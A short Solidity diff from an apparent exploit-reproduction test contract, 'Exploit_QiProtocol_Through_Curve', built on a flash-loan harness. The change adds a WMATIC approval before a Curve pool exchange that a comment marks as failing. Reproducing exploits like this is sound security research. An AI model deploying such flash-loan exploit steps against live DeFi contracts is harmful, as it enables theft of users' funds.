@@ -253,6 +253,7 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
         uint256 amountIn = QIDAO.balanceOf(address(this));
         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, 1, path, address(this), block.timestamp); // Qi Tokens for WMATIC
 
+        WMATIC.approve(address(CURVE_POOL), type(uint256).max);
         CURVE_POOL.exchange(1, 0, 20000000000000000000000, 8964360265059868271032, false); // ---------- THIS IS FAILING. Tried with locals (balanceOf) also.
         WMATIC.deposit{value: address(this).balance}();
         
